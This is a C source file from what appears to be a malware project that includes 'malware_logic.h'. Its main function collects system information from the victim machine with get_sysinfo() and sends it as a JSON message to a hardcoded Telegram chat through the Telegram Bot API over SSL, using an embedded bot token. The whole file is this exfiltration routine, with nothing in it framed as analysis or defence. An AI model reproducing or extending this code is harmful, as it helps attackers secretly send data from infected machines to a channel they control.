//
// Created by Riven on 23.07.2021.
//

#include "telegram.h"
#include "malware_logic.h"
#include "jsonParser.h"
#include "net.h"
#include <math.h>

char* itoa_(long long int number, char* array) {
	int len;
	char flag;

	flag = TRUE;
	if (number < 0) {flag = FALSE; number *= -1;}
	len = flag? log10(number) : log10(number) + 1;
	array = (char*)calloc(len + 1, sizeof(char));
	if (!flag) array[0] = '-';
	while (number != 0) {
		array[len] = number % 10 + '0';
		number /= 10;
		len--;
	}
	return array;
}


void sendMessageByID(long long int id, char* message) {
	char*	chat_id;
	char*	crafted_body;

	int 	temp;

	crafted_body = (char*)malloc(sizeof(char) * 1024);

	chat_id = itoa_(id, chat_id);

	if (!(temp = snprintf(crafted_body, 1023, "{\"chat_id\":%s, \"text\":\"%s\"}", chat_id, message))) {
		printf("Can't sprintf to method.");
		exit(-1);
	} else
		crafted_body[temp + 1] = '\0';

	make_secure_connection("api.telegram.org",
									  "443", auth_token, "sendMessage", crafted_body);
	free(crafted_body);
	free(chat_id);
}


int main(void) {
	char* 			message;
	long long int	id;

	init_ssl();
	id = -1001592971105;
	message = get_sysinfo();
	sendMessageByID(id, message);
}
